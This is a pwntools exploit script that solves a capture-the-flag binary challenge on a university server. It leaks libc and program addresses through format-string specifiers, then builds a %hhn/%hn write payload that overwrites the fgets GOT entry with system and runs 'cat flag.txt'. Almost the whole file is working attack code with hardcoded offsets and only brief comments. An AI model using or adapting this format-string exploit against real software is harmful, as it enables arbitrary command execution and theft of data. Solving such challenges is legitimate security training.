from pwn import *
debug_mode = False
online = True

if debug_mode:
    r = process("./bin", env={"LD_PRELOAD":"./libc.so.6"})
    gdb.attach(r,
    # break *main+144
    # break *main+139
    """
    break system
    continue
    """)
else:
    if online:
        r = remote("cyberchallenge.disi.unitn.it", 50231)
    else:
        r = process("./bin", env={"LD_PRELOAD":"./libc.so.6"})

# pmap -x $(pidof bin)
# printf is in the second lobc.so.6 block
# libc_base is the first block 0000757e42e00000
pmap = """
Address           Kbytes     RSS   Dirty Mode  Mapping
00005a2818c37000       4       4       0 r---- bin
00005a2818c38000       4       4       0 r-x-- bin
00005a2818c39000       4       4       0 r---- bin
00005a2818c3a000       4       4       4 r---- bin
00005a2818c3b000       4       4       4 rw--- bin
00007ed4dbf95000      12       8       8 rw---   [ anon ]
00007ed4dbf98000     144     144       0 r---- libc.so.6
00007ed4dbfbc000    1456     912       0 r-x-- libc.so.6
00007ed4dc128000     312       0       0 r---- libc.so.6
00007ed4dc176000      16      16      16 r---- libc.so.6
00007ed4dc17a000       8       8       8 rw--- libc.so.6
00007ed4dc17c000      40      24      24 rw---   [ anon ]
00007ed4dc1b6000       4       4       0 r---- ld-linux-x86-64.so.2
00007ed4dc1b7000     156     156       0 r-x-- ld-linux-x86-64.so.2
00007ed4dc1de000      40      40       0 r---- ld-linux-x86-64.so.2
00007ed4dc1e8000       8       8       8 r---- ld-linux-x86-64.so.2
00007ed4dc1ea000       8       8       8 rw--- ld-linux-x86-64.so.2
00007ffd07204000     132      16      16 rw---   [ stack ]
00007ffd0728e000      16       0       0 r----   [ anon ]
00007ffd07292000       8       4       0 r-x--   [ anon ]
ffffffffff600000       4       0       0 --x--   [ anon ]
---------------- ------- ------- -------
"""

# the first one is always in the last libc.so.6 block
r.sendlineafter(b"> ", b"%1$lx")
addr = r.recvuntil(b"> ")   
addr = addr.split(b"\n")[0]
addr = int(addr, 16)
libc = ELF("./libc.so.6")
# the difference between leaked address and the libc base is always the same
libc_base = addr - (0x7ffff7dfeb43-0x7ffff7c00000)
system_offset = libc.symbols["system"]
printf_offset = libc.symbols["printf"]
fgets_offset = libc.symbols["fgets"]
target_address = libc_base + system_offset
target_system = libc_base + 0xeb58e
# got from gdb before starting program, this offset must be added to the first entry of pmap
executable = context.binary = ELF('./bin', checksec=False)
# with a bruteforce I found that %20$lx is in the same section as plt, so by getting two values
# I can calculate the offset from that to the base of the program
address_diff = 0x5c8f086c7040 - 0x5c8f086c7000

payload = ""
# in this range there is the address of something in the same section as the plt
for i in range(17, 22):
    payload += f".%{i}$lx"

r.sendline(payload.encode())
line = r.recvline().split(b".")
# it is 0x40 in local 159 if online, this can also be seen by hand by checking for values
# that start with a number, is at least 12 chars long and does not have fff after the number
valid = []
print("Line:", line)
for x in line:
    if len(x) > 11 and isinstance(x[0], int) and not x[1:].startswith(b"ff"):
        valid.append(x)
if len(valid) > 1:
    print(valid)
    x = input("Choose the right one")
    plt_block = int(valid[int(x)], 16)
else:
    plt_block = int(valid[0], 16)
executable.address = plt_block - address_diff
executable.address = executable.address & 0xfffffffffffff000
got_address = executable.got['fgets']
# got_system_offset = libc.got['system'] - libc.symbols['fgets']
# got_system = executable.got['fgets'] + got_system_offset
# print(hex(got_system), hex(got_address))

# https://cotonne.github.io/binary/2020/07/14/format-string.html
context.clear(arch = 'amd64')
def send_payload(payload):
        s.sendafter(b">", payload+b"\n", timeout=1)
        r = s.recvline(timeout=1)
        return r
s = process('./bin')
original_position = int(FmtStr(execute_fmt=send_payload).offset)

# now we redirect printf to system
third_byte = (target_address >> 16) & 0xff
first_two_bytes = target_address & 0xffff
max_size = 16
payload = "AAA"
param_string = "cat flag.txt & "
third_byte -= len(param_string)
first_two_bytes -= len(param_string)
print(hex(libc_base+fgets_offset), hex(libc_base+printf_offset), hex(target_address))
# 0x7ffff7c55230
print(first_two_bytes, third_byte)
print(hex(got_address), hex(target_address))
while len(payload) % 8 != 0:
    position = original_position + max_size//8
    payload = f"{param_string}%{third_byte}c%{position}$hhn%{first_two_bytes - third_byte}c%{position+1}$hn".ljust(max_size).encode() + p64(got_address+2) + p64(got_address)
    # payload = f"%{first_byte}c%10$hhn%{second_byte - first_byte}c%11$hhn%{third_byte-second_byte}c%12$hhn".ljust(36, "A").encode() + p64(got_address) + p64(got_address+1) + p64(got_address+2)
    max_size += 8
print(payload, len(payload))
r.sendline(payload)
# text = r.recvline_contains(b"UniTN{", timeout=1)
print(r.recvall(timeout=2))
# r.close()
# print(text)